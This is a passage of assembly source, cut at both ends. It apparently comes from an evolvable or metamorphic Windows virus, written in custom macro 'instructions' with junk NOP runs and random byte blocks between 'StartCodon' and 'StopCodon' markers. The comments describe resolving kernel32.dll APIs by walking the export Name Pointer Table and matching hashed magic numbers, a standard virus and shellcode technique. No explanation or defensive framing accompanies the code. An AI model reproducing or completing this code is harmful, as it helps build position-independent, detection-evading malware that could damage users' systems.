        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
db StopCodon
db 216
db 154
db 100
db 22
db 205
db 91
db 106
db 90
db 31
db 10
db StartCodon
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
db StopCodon
db 239
db StartCodon
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _writeDWord              ; Save number of kernel32.dll APIs
    _getDO
    BigNum=hAddressePointer-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _saveWrtOff
db StopCodon
db 223
db 146
db 24
db 186
db 165
db 200
db 223
db 142
db 204
db 147
db 42
db 18
db 77
db 247
db 205
db 194
db 175
db 36
db 189
db 135
db 115
db 242
db 192
db 49
db 66
db 228
db 229
db StartCodon
    _getDO
    BigNum=APIAddresses-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
db StopCodon
db 134
db 40
db 217
db 244
db 195
db 240
db 101
db 223
db 38
db 191
db 132
db 119
db 48
db 238
db 230
db 43
db 23
db 133
db 201
db 111
db 124
db 61
db 52
db 160
db 235
db 123
db 56
db 31
db 15
db 243
db 169
db 236
db 103
db 254
db StartCodon
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _writeDWord      ; Saves the AddressePointer
    _getDO
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
    BigNum=hMagicNumberPointer-DataOffset
    AlreadyStarted=0
db StopCodon
db 217
db 89
db 92
db 99
db 163
db 76
db 0
db 115
db 102
db 28
db 160
db 129
db 211
db 142
db 106
db 79
db 117
db 95
db 66
db 44
db 45
db 218
db 21
db 155
db 12
db 41
db 50
db 156
db 113
db 137
db 224
db 201
db 29
db 190
db 90
db 234
db 204
db 54
db 68
db StartCodon
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _saveWrtOff
    _getDO
    BigNum=APIMagicNumbersKernel-DataOffset
    AlreadyStarted=0
db StopCodon
db 93
db 95
db 74
db 194
db 6
db 107
db 154
db 186
db 208
db 77
db 53
db 91
db 241
db 51
db 76
db 77
db 121
db StartCodon
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _writeDWord      ; Saves the MagicNumber Pointer
db StopCodon
db 39
db 128
db 240
db 174
db 144
db 182
db 35
db 60
db 232
db 28
db 48
db 209
db 10
db 92
db 189
db 72
db 185
db 251
db 182
db 198
db 224
db 1
db 27
db 28
db 142
db 87
db 127
db 4
db 22
db 236
db 166
db 189
db 122
db 222
db 60
db 238
db 205
db 137
db 236
db 101
db 185
db 73
db 37
db 65
db 177
db 205
db 178
db 245
db 15
db 37
db 214
db 121
db 244
db 100
db 96
db 142
db 235
db 218
db StartCodon
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
    BigNum=43
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
db StopCodon
db 24
db 104
db 146
db 156
db 179
db 155
db 159
db 41
db 247
db 86
db 185
db 143
db 218
db 16
db 151
db 148
db 18
db 217
db 11
db 83
db 178
db 186
db 120
db 79
db 40
db 243
db 177
db 100
db 93
db 21
db 79
db 9
db 88
db 30
db StartCodon
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _push
; FindAllAPIs
       _getEIP
       _sub0001
       _sub0001
       _sub0001
       _sub0001
       _sub0001
       _saveJmpOff      ; mov BA2, eip  - for further API searching in different DLLs
       _pushall
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
               _nopdB          ; RegB = Counter for first instance loop = 0
    _getDO
db StopCodon
db 85
db 248
db 167
db 247
db 244
db 166
db 73
db 222
db 179
db 5
db 138
db 46
db 65
db 56
db 156
db 251
db 212
db 248
db 186
db 106
db 0
db 44
db 140
db 147
db 210
db 237
db 192
db 223
db 155
db 48
db 121
db 188
db 23
db 132
db 4
db 72
db 121
db 109
db 112
db 104
db 18
db 42
db 28
db 65
db 142
db 23
db 112
db 44
db StartCodon
    BigNum=hAddressePointer-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
               _getdata
               _nopdA           ; RegA = Pointer to Buffer for API Addresse
    _getDO
    BigNum=hMagicNumberPointer-DataOffset
    AlreadyStarted=0
    if BigNum<25
db StopCodon
db 101
db 6
db 121
db 231
db 101
db 50
db 155
db 58
db 11
db 74
db 186
db 53
db 162
db 54
db 171
db 27
db 21
db 228
db 71
db 51
db 161
db 218
db StartCodon
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
db StopCodon
db 200
db 85
db 114
db 31
db 99
db 170
db 222
db 179
db 148
db 242
db 238
db StartCodon
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
               _getdata
               _nopdD           ; RegD = Pointer to Magic Numbers for APIs
           ; FindAllAPIsNext
               _getEIP
               _sub0001
db StopCodon
db 4
db 89
db 214
db 213
db 166
db 126
db 249
db StartCodon
               _sub0001
               _sub0001
               _sub0001
               _sub0001
               _saveJmpOff      ; mov BA2, eip
               _pushall
                       ; RegA=free  | used for pointer within the Name Pointer Table
                       ; RegB=free  | used as temporary buffer
                       ; RegD=MagicNumber for API
                       ; Stack:  | counter (number of APIs checked in kernel32.dll)
    _getDO
    BigNum=hNamePointerTable-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
db StopCodon
db 107
db 90
db 33
db 173
db 99
db 52
db 90
db 76
db 214
db 180
db 216
db 9
db 232
db 224
db 140
db 197
db 84
db 68
db 33
db 231
db 48
db 189
db 22
db 15
db 91
db 33
db 85
db 73
db 58
db StartCodon
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
                       _getdata
                       _nopdA               ; Pointer to Name Pointer Table (points to first API)
db StopCodon
db 137
db 192
db 245
db 136
db 14
db 149
db 182
db 22
db 235
db 42
db 220
db 73
db 135
db 117
db 153
db 228
db 220
db 227
db 200
db 10
db 216
db 95
db 206
db 242
db 192
db 80
db 33
db 195
db 134
db 235
db 58
db 151
db 102
db 233
db 70
db 151
db 20
db 101
db 95
db 109
db 246
db 225
db 91
db 195
db 154
db 56
db 30
db 243
db 173
db 157
db 100
db 178
db 27
db 190
db 127
db 118
db 181
db 221
db 176
db 149
db 0
db 122
db 46
db 60
db 254
db 244
db 205
db 42
db 46
db 184
db 125
db 217
db 2
db 130
db 97
db 204
db 47
db 8
db 145
db 101
db 132
db 83
db 248
db 190
db 219
db 163
db 165
db 157
db 223
db 86
db 15
db 221
db 91
db 118
db StartCodon
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
                       _sub0001
                       _push                ; counter
                  ; SearchNextAPI:
                       _getEIP
                       _sub0001
                       _sub0001
                       _sub0001
                       _sub0001
                       _sub0001
                       _saveJmpOff          ; mov BA2, eip
                       _pop
    BigNum=0x1
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
                       _push
    _getDO
    BigNum=hDLLlibrary32-DataOffset
    AlreadyStarted=0
db StopCodon
db 1
db 34
db 238
db 85
db 203
db 196
db 151
db 74
db 134
db 25
db 71
db 100
db 149
db 37
db 190
db 99
db 23
db 7
db 75
db 166
db StartCodon
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
_nopREAL
        _pushall                ; save all registers
db StopCodon
db 193
db 142
db 58
db 173
db 175
db 177
db 240
db 64
db 76
db 236
db 92
db 132
db 80
db 113
db 184
db 80
db 140
db 168
db 206
db 142
db 26
db 218
db 255
db 77
db 63
db 48
db 75
db 87
db 5
db 108
db 168
db 85
db 240
db 199
db 248
db 77
db 137
db 5
db 146
db 12
db 243
db 125
db 42
db 101
db 146
db 57
db 138
db 138
db 246
db 87
db 20
db 68
db 207
db 3
db 254
db StartCodon
        _push                   ; save BC1
db StopCodon
db 175
db 11
db 5
db 178
db 156
db 193
db 81
db 207
db 104
db 94
db 187
db 50
db 171
db 104
db 171
db 118
db 194
db 21
db 69
db 154
db 117
db 215
db 110
db 244
db 233
db 91
db 164
db 109
db 250
db 137
db 82
db 4
db StartCodon
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
db StopCodon
db 111
db 180
db 2
db 33
db 209
db 209
db 11
db 63
db 46
db 185
db 212
db 151
db 136
db 181
db 192
db 33
db 135
db 184
db 45
db 128
db 239
db 23
db 40
db 218
db 116
db 211
db 224
db 63
db 91
db 121
db 252
db 245
db 159
db 195
db 121
db 231
db 130
db 135
db 134
db 85
db 118
db 147
db 77
db 167
db 239
db 36
db 64
db 85
db 175
db 30
db 217
db 78
db 4
db StartCodon
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
db StopCodon
db 5
db 117
db 69
db 18
db 237
db 103
db 236
db 105
db 60
db 147
db 107
db 24
db 238
db 34
db 215
db 80
db 233
db 254
db 245
db 210
db 204
db 101
db 116
db 236
db 177
db 188
db 186
db 192
db 3
db 228
db 161
db 138
db 109
db 187
db 150
db 204
db 203
db 198
db 47
db 169
db 98
db 105
db 166
db 150
db 236
db StartCodon
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
                       _getdata
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
                       _save                ; kernel32.dll position
                       _nopsA               ; Pointer to NamePointerTable
                       _getdata             ; Points to API name
                       _addsaved            ; relative -> absolut
db StopCodon
db 33
db 69
db StartCodon
                       _sub0001             ; -- (for algorithm)
                       _nopdB              ; save Pointer to API name
                       _nopsA
    BigNum=4
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
                       _nopdA               ; Has just effects in next loop
                       _pushall
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
                               _nopdA
                               _getEIP
                               _sub0001
                               _sub0001
                               _sub0001
                               _sub0001
                               _sub0001
                               _saveJmpOff          ; mov BA2, eip
                               _nopsA
                               _save                ; RegA=MagicNumber
                               _nopsB
    BigNum=1
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
                               _nopdB              ; BC1=NamePointer++
                               _getdata             ; BC1=dword[NamePointer+n]
                               _addsaved            ; BC1=BC1 + BC2 = dword[NamePointer+n] xor MagicNumber
                               _nopdA
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
    BigNum=8
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
db StopCodon
db 146
db 80
db 49
db 100
db 155
db 239
db 174
db 247
db 89
db 198
db 5
db 74
db 144
db 142
db 174
db 182
db 85
db 21
db StartCodon
        _writeDWord             ; mov dword[RegC], BC1
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
                               _save
                               _nopsB
                               _getdata             ; BC1=nxxx
                               _shr                 ; BC1=???n
                               _push
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
    BigNum=0xFF
